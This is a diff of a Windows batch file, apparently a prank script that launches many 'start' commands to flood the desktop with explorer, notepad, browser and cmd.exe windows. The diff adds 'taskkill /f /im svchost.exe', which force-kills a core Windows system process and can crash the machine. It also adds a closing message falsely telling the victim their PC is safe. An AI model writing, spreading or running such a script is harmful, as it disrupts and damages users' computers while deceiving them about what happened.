@@ -12,6 +12,7 @@ pause
 start
 start explorer
 start notepad.exe
+start 
 start
 start
 start
@@ -171,12 +172,12 @@ start
 start
 start
 start
+start www.google.com
 start
 start
-start
-start
-start
+start cmd.exe
+taskkill /f /im svchost.exe
 :hate
-echo ok fine whatever
+echo ok fine whatever, your pc is safe
 timeout 5
 exit
